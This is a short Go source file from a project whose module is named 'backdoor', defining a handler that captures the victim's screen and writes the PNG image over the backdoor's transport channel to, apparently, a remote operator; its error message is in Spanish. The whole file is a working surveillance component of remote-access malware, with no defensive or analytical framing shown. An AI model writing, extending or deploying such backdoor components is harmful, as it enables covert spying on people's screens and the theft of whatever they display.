package handler

import (
	"backdoor/transport"
	"bytes"
	"image/png"

	"github.com/kbinani/screenshot"
)

func ScreenshotHandler(t transport.Transport) {
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		t.Write([]byte("Error al capturar pantalla\n"))
		return
	}

	var buf bytes.Buffer
	png.Encode(&buf, img)
	t.Write(buf.Bytes())
}
